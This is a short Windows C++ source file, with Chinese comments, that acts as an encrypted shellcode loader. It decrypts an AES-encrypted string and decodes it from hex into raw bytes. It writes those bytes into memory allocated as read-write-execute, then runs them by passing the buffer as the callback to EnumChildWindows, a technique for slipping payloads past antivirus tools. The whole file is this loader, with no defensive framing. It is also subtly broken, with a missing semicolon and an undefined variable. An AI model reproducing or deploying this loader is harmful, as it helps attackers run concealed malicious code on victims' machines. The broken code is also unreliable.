#include "Rijndael.h"
#include <iostream>
#include <windows.h>
#define SHELLCODELEN 4096

using namespace std;

void main()
{
	string encrypt_data
	string decrpt_de = decryt(encrypt_data_64);
	char shellcode[4096] = { 0 };
	strcpy(shellcode, decrpt_de.c_str());
	// 处理padding
	char buff[SHELLCODELEN] = { 0 };
	for (int i = 0; i < strlen(shellcode); i++) {
		buff[i] = shellcode[i];
	}

	// shellcode 处理，两个两个一起，还原成 \x00 的样子
	unsigned int char_in_hex;
	unsigned int iterations = strlen(shellcode);
	for (unsigned int i = 0; i < iterations - 1; i++) {
		sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
		shellcode[i] = (char)char_in_hex;
	}


	LPVOID newMemory;
	HANDLE currentProcess;
	SIZE_T bytesWritten;
	BOOL didWeCopy = FALSE;

	// Get the current process handle 
	currentProcess = GetCurrentProcess();

	// Allocate memory with Read+Write+Execute permissions 
	newMemory = VirtualAllocEx(currentProcess, NULL, SHELLCODELEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (newMemory == NULL)
		return;

	// Copy the shellcode into the memory we just created 
	didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&shellcode, SHELLCODELEN, &bytesWritten);

	if (!didWeCopy)
		return;

	EnumChildWindows((HWND)NULL, (WNDENUMPROC)newMemory, NULL);
	
	return;
}